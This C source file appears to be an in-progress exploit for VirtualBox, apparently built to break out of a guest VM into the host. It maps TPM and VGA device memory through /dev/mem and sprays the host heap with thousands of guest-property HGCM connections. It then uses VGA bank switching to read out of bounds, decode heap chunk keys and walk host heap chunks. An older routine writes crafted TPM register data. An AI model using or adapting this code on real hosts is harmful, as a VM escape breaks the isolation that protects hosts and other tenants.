#include <stdio.h>
#include <sys/mman.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <immintrin.h>
#include <string.h>
#include <assert.h>
#include <sys/io.h>
#include "vmm.h"

#define DEBUG

#define RT_BIT(n) (1<<n)
#define off(locality, uReg) (locality * 0x1000 + uReg)
#define TPM_CMD_BUF_SIZE 0xf80
#define PAGE_SIZE 0x1000
#define VMMDEV_REQUESTOR_USR_DRV 0x00000001
#define VMMDEV_REQUESTOR_USR_ROOT 0x00000003
#define VMMDEV_REQUESTOR_USR_USER 0x00000006

const size_t TPM_MMIO_ADDR = 0xfed40000;
const size_t TPM_MMIO_SIZE = 0x5000;
const size_t VGA_MMIO_ADDR = 0xa0000;
const size_t VGA_MMIO_SIZE = 0x20000;

void *reqBuf;                                                                                                                                                                         
uint32_t *cliIDs;                                                                                                                                                                     
uint32_t idx;                                                                                                                                                                         
uint8_t *vga;
const uint32_t chunkSizeMetadataOffset = 0x8;
const uint32_t chunkPrevSizeMetadatOffset = 0xc;
const uint16_t VGAR3BufferHeapSize = 0x8001; // size shifted right by 4, actual size is 0x80010
uint16_t heapPrevSizeKey;
uint16_t heapSizeKey;

void die(const char* msg)
{
        perror(msg);
        exit(-1);
}

void *map_mmio(const size_t MMIO_ADDR, const size_t MMIO_SIZE)
{
        int fd = open("/dev/mem", O_RDWR | O_SYNC);
        if (fd == -1) die("map_mmio");
        void *addr = mmap(NULL, MMIO_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, MMIO_ADDR);
        if (addr == NULL) die("map_mmio");
        printf("mmio @ %p\n", addr);
        return addr;
}



void init()
{
        setvbuf(stdin, NULL, _IONBF, 0);
        setvbuf(stdout, NULL, _IONBF, 0);
        reqBuf = mmap(NULL , PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
        if (reqBuf == (void*)(-1)) die("init - mmap");
        printf("HGCM Buffer @ %p\n", reqBuf);
        if (mlock(reqBuf, 0x1000)) die("init - mlock");
        memset(reqBuf, 0, PAGE_SIZE);
        vga = (uint8_t*)map_mmio(VGA_MMIO_ADDR, VGA_MMIO_SIZE);
        cliIDs = (uint32_t*)malloc(4096 * sizeof(uint32_t));
        iopl(3);
}

uint64_t v2p(void* p)
{
        uint64_t virt = (uint64_t)p;
// Assert page alignment
        assert((virt & (PAGE_SIZE - 1)) == 0);
        int fd = open("/proc/self/pagemap", O_RDONLY);
        if (fd == -1) die("open");
        uint64_t offset = (virt / PAGE_SIZE) * 8;
        lseek(fd, offset, SEEK_SET);
        uint64_t phys;
        if (read(fd, &phys, 8 ) != 8) die("read");
        close(fd);
// Assert page present
        assert(phys & (1ULL << 63));
        phys = (phys & ((1ULL << 54) - 1)) * PAGE_SIZE;
        return phys;
}

uint32_t HGCMConnect(const char *service, uint32_t fRequestor)
{
        //VMMDevHGCMConnect* hHGCMConnect = (VMMDevHGCMConnect*)mmap(0, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
        VMMDevHGCMConnect* hHGCMConnect = (VMMDevHGCMConnect*)reqBuf;
        memset(hHGCMConnect, 0, PAGE_SIZE);
        hHGCMConnect->header.header.size = sizeof(*hHGCMConnect);
        hHGCMConnect->header.header.version = VMMDEV_REQUEST_HEADER_VERSION;
        hHGCMConnect->header.header.requestType = VMMDevReq_HGCMConnect;
        hHGCMConnect->header.header.fRequestor = fRequestor;
        hHGCMConnect->loc.type = VMMDevHGCMLoc_LocalHost_Existing;
        strcpy(hHGCMConnect->loc.u.host.achName,service);
        outl_p(v2p(hHGCMConnect), 0xd040);
        //while (!hHGCMConnect->u32ClientID){usleep(1000);}
        if (!hHGCMConnect->u32ClientID){usleep(1000);}
        //printf("HGCM Client Connection ID: %u\n", hHGCMConnect->u32ClientID);
        return hHGCMConnect->u32ClientID;
}

uint32_t HGCMDisconnect(uint32_t clientID)
{
        VMMDevHGCMDisconnect* hHGCMDisconnect = (VMMDevHGCMDisconnect*)reqBuf;
        memset(hHGCMDisconnect, 0, PAGE_SIZE);
        hHGCMDisconnect->header.header.version = VMMDEV_REQUEST_HEADER_VERSION;
        hHGCMDisconnect->header.header.size = sizeof(*hHGCMDisconnect);
        hHGCMDisconnect->header.header.requestType = VMMDevReq_HGCMDisconnect; 
        hHGCMDisconnect->u32ClientID = clientID;
        outl_p(v2p(hHGCMDisconnect), 0xd040);
}

uint32_t switchVGA(uint8_t n, uint8_t byteOffset)
{
        outw_p(0x6, 0x3ce); // pThis->gr_index = 6
        outw_p(0x6, 0x3cf); // pThis->gr[pThis->gr_index] = 6
        outw_p(0x4, 0x3ce); // pThis->gr_index = 4
        outw_p(byteOffset, 0x3cf); // pThis->gr[pThis->gr_index] = byteOffset
        outw_p(0x4, 0x3c4); // pThis->sr_index = 4
        outw_p(0x4, 0x3c5); // pThis->sr[pThis->sr_index] = 4
        outw_p(0x5, 0x1ce); // set VBE register index
        outw_p(n, 0x1cf); // set VBE bank_offset to n << 16
}

VMMDevHGCMRequestHeader *HGCMCall(uint32_t clientID, uint32_t func, uint32_t cParms, HGCMFunctionParameter32* params)
{
        //VMMDevHGCMCall32 *hHGCMCall = (VMMDevHGCMCall32*)mmap(0, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
        VMMDevHGCMCall32 *hHGCMCall = (VMMDevHGCMCall32*)reqBuf;
        memset(hHGCMCall, 0, PAGE_SIZE);
        hHGCMCall->header.header.size = sizeof(*hHGCMCall) + cParms * sizeof(params[0]);
        /*req->header.header.size = 0x408;*/
        hHGCMCall->header.header.version = VMMDEV_REQUEST_HEADER_VERSION;
        hHGCMCall->header.header.requestType = VMMDevReq_HGCMCall32;
        hHGCMCall->u32ClientID = clientID;
        hHGCMCall->u32Function = func;
        hHGCMCall->cParms = cParms;
        memcpy((void*)hHGCMCall->params, params, sizeof(params[0]) * cParms);
        outl_p(v2p(hHGCMCall), 0xd040);
        return (VMMDevHGCMRequestHeader*)reqBuf;
}


int wait_prop(uint32_t clientID, char* pattern, int pattern_size, char* out, int outsize) {
        //assert((uint64_t)pattern < 1ll << 32);
        //assert((uint64_t)out < 1ll << 32);

        HGCMFunctionParameter32 params[4];
        params[0].type = VMMDevHGCMParmType_LinAddr_In;
        params[0].u.Pointer.u.linearAddr = (RTGCPTR32)pattern;
        params[0].u.Pointer.size = pattern_size;
        params[1].type = VMMDevHGCMParmType_64bit;
        params[1].u.value64 = 0;
        params[2].type = VMMDevHGCMParmType_LinAddr_Out;
        params[2].u.Pointer.u.linearAddr = (RTGCPTR32)out;
        params[2].u.Pointer.size = outsize;
        params[3].type = VMMDevHGCMParmType_32bit;
        VMMDevHGCMRequestHeader *req = HGCMCall(clientID, GET_NOTIFICATION, 4, params);
        return req->header.rc;
        //printf("wait_prop - rc: %x\n", req->header.rc);
        //printf("wait_prop - result: %x\n", req->result);
}

const char *dummy = "\x80\x01\x00\x00\x00\n\x00\x00\x01|";

int oldmain()
{
        u_int64_t *tpm = map_mmio(TPM_MMIO_ADDR, TPM_MMIO_SIZE);
        char *tpm1B = (char*)tpm;
        u_int64_t opcode;
        u_int64_t offset;
        u_int64_t locality = 0;
        char hehe[512];
        memset(hehe, 0x41, 512);

        opcode = 0x0;
        offset = off(locality, 0x0);
        opcode |= RT_BIT(1);
        tpm[offset] = opcode;

        offset = off(locality, 0x10);

        //padding
        for (int i = 0; i < 0xb; ++i)
        {
                opcode = 0x4141414141414141;
                tpm[offset] = opcode;
        }

        //tpm[offset] = 0xdeadbeefcafebabe;

        offset = off(locality, 0x24);
        for (int i = 0; i < 0xa; ++i)
        {
                opcode = dummy[0xa-1-i];
                tpm1B[offset] = opcode;
        }

        opcode = 0x0;
        offset = off(locality, (0x18/0x8));
        opcode |= RT_BIT(5);
        tpm[offset] = opcode;

        _fxrstor64(tpm+0x10);
        return 0;
}

void spray()
{
        char check;
        char *tmp = malloc(0x70);
        char *tmp2 = malloc(0x20);
        idx = 0;
        for (uint32_t round = 0; round < 3000; ++round)
        {
                uint32_t cID = HGCMConnect("VBoxGuestPropSvc", VMMDEV_REQUESTOR_USR_DRV);
                //printf("%d", round);
                if (cID == 0) 
                {
                        //printf(" failed!\n");
                        continue;
                }
                cliIDs[idx++] = cID;
                //printf(" success!\n");
                for (uint32_t i = 0; i < 16; ++i)
                {
                        memset(tmp, 0, 0x70);
                        sprintf(tmp, "%08d/%08d-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", round+1, i+1);
                        //printf("Spraying %s -> ", tmp);
                        //printf("%d - Result: %x\n", i, wait_prop(cID, tmp, 0x70, tmp2, 0x1));
                }
        }
        for (uint32_t round = 0; round < 2000; ++round)
        {
                uint32_t cID = HGCMConnect("VBoxGuestPropSvc", VMMDEV_REQUESTOR_USR_ROOT);
                //printf("%d", round);
                if (cID == 0) 
                {
                        //printf(" failed!\n");
                        continue;
                }
                cliIDs[idx++] = cID;
                //printf(" success!\n");
                for (uint32_t i = 0; i < 16; ++i)
                {
                        memset(tmp, 0, 0x70);
                        sprintf(tmp, "%08d/%08d-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", round+1, i+1);
                        //printf("Spraying %s -> ", tmp);
                        //printf("%d - Result: %x\n", i, wait_prop(cID, tmp, 0x70, tmp2, 0x1));
                }
        }
        for (uint32_t round = 0; round < 1024; ++round)
        {
                uint32_t cID = HGCMConnect("VBoxGuestPropSvc", VMMDEV_REQUESTOR_USR_USER);
                //printf("%d", round);
                if (cID == 0) 
                {
                        //printf(" failed!\n");
                        continue;
                }
                cliIDs[idx++] = cID;
                //printf(" success!\n");
                for (uint32_t i = 0; i < 16; ++i)
                {
                        memset(tmp, 0, 0x70);
                        sprintf(tmp, "%08d/%08d-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", round+1, i+1);
                        //printf("Spraying %s -> ", tmp);
                        //printf("%d - Result: %x\n", i, wait_prop(cID, tmp, 0x70, tmp2, 0x1));
                }
        }
        printf("Searching...\n");
        /*
        switchVGA(0x2);
        for (int oob = 0; oob < 0x10000; ++oob)
        {
                if (vga[oob+5] == 0x7f && vga[oob+1] == 0x7 && vga[oob] == 0x80)
                {
                        for (int j = 0; j<6; ++j)
                        {
                                printf("0x%hhx ", vga[oob+j]);
                        }
                        printf("\n");
                        exit(0);
                }
        }
        switchVGA(0x3);
        for (int oob = 0; oob < 0x10000; ++oob)
        {
                if (vga[oob+5] == 0x7f && vga[oob+1] == 0x7 && vga[oob] == 0x80)
                {
                        for (int j = 0; j<6; ++j)
                        {
                                printf("0x%hhx ", vga[oob+j]);
                        }
                        printf("\n");
                        exit(0);
                }
        }
        switchVGA(0x4);
        for (int oob = 0; oob < 0x10000; ++oob)
        {
                if (vga[oob+5] == 0x7f && vga[oob+1] == 0x7 && vga[oob] == 0x80)
                {
                        for (int j = 0; j<6; ++j)
                        {
                                printf("0x%hhx ", vga[oob+j]);
                        }
                        printf("\n");
                        exit(0);
                }
        }
        */
        //printf("Disconnecting clients...\n");
        //while (idx > -1) HGCMDisconnect(cliIDs[--idx]);
        //memset(cliIDs, 0, sizeof(uint32_t) * 4096);
        //sleep(3);
}

void checkHeapKeys()
{
	uint16_t prevsizeKey;
        uint16_t chunkSizeKey;
        uint64_t mightBePrevChunkSize;
        uint64_t chunkSize;
    switchVGA(2, 0);
    prevsizeKey = *(vga+3);
    switchVGA(2, 1);
    prevsizeKey += *(vga+3) << 8;
    prevsizeKey ^= VGAR3BufferHeapSize;
    
    uint64_t readCount = 0;
    while (1)
    {
        switchVGA(2, 0);
        mightBePrevChunkSize = *(vga+readCount+3);
        switchVGA(2, 1);
        mightBePrevChunkSize += *(vga+readCount+3) << 8;
        if ((readCount * 4) == (mightBePrevChunkSize ^ prevsizeKey) << 4)
        {
                switchVGA(2, 0);
                chunkSize = *(vga+2);
                switchVGA(2, 1);
                chunkSize += *(vga+2) << 8;
                chunkSizeKey = chunkSize ^ ((readCount * 4) >> 4);
                break;
        }
        ++readCount;
    }
    heapPrevSizeKey = prevsizeKey;
    heapSizeKey = chunkSizeKey;
    printf("0x%x\n", prevsizeKey);
    printf("0x%x\n", chunkSizeKey);
}

void holyScan()
{
        // please work Jesus Christ...
        uint64_t readCount = 0;
        uint32_t currentPage = 2;
        uint64_t ptr; //???
        uint8_t freed;
        uint64_t currentChunkSize;
        uint64_t currentPrevChunkSize;
        // just to trigger debugger?
#ifdef DEBUG
        printf("Press enter to trigger...");
        getchar();
        uint8_t tmp = *(vga);
        printf("Input ptr: ");
        scanf("%lx", &ptr);
#endif
        while (1){
                switchVGA(currentPage, 0);
                currentChunkSize = *(vga+readCount+2);
                switchVGA(currentPage, 1);
                currentChunkSize += *(vga+readCount+2) << 8;
                printf("------ DEBUG ------\n");
		printf("Encoded current chunk size: 0x%lx\n", currentChunkSize);
                currentChunkSize ^= heapSizeKey;
                currentChunkSize <<= 4;
                switchVGA(currentPage, 2);
                freed = *(vga+readCount+2) & 1;
		printf("Freed? 0x%x\n", freed);
                printf("Current page: %d\n", currentPage);
                printf("Read: 0x%lx\n", readCount);
                printf("Current chunk size: 0x%lx\n", currentChunkSize);
#ifdef DEBUG
                printf("Current address: 0x%lx\n", ptr);
#endif
                //getchar();
		sleep(1);
                if (currentChunkSize == 0x80 && !freed) break;
                readCount += currentChunkSize / 4;
                ptr += currentChunkSize;
                if (readCount > 0xffff)
                {
                        currentPage += (readCount / 0x10000);
                        readCount %= 0x10000;
                }
                if (currentPage > 7)
                {
                        printf("Cannot read anymore, exceeded...\n");
                        break;
                }
                switchVGA(currentPage, 0);
                currentPrevChunkSize = *(vga+readCount+3);
                switchVGA(currentPage, 1);
                currentPrevChunkSize += *(vga+readCount+3) << 8;
                printf("0x%lx\n", currentPrevChunkSize);
                currentPrevChunkSize ^= heapPrevSizeKey;
                printf("0x%lx\n", currentPrevChunkSize);
                currentPrevChunkSize <<= 4;
                printf("0x%lx\n", currentPrevChunkSize);
                printf("Append address: 0x%lx + 0x%lx\n", currentPage * 0x10000 * 4, readCount * 4);
                if (currentPrevChunkSize != currentChunkSize)
                {
                        printf("Broken walk???\n");
                        printf("0x%lx != 0x%lx", currentChunkSize, currentPrevChunkSize);
                        break;
                }
                printf("-------------------\n");
        }
}

int main()
{
	init();
        //while (1) spray();
        checkHeapKeys();
        spray();
        printf("God Bless You!\n");
        getchar();
        holyScan();
        //switchVGA(0);
        //printf("0x%hhx ", vga[0]);
}
